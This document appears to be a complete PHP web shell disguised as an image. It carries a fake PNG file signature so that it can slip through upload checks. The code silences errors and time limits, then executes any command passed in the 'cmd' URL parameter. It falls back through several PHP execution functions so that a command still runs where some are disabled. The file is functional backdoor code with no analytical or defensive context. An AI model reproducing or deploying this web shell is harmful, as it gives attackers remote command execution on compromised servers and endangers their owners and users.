‰PNG

<?php
@error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);

if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    
    // Multiple execution methods
    if(function_exists('system')) {
        @system($cmd);
    } elseif(function_exists('exec')) {
        @exec($cmd, $output);
        echo implode("
", $output);
    } elseif(function_exists('shell_exec')) {
        echo @shell_exec($cmd);
    } elseif(function_exists('passthru')) {
        @passthru($cmd);
    } elseif(function_exists('popen')) {
        $proc = @popen($cmd, 'r');
        while(!@feof($proc)) { echo @fread($proc, 4096); }
        @pclose($proc);
    }
}
__halt_compiler(); ?>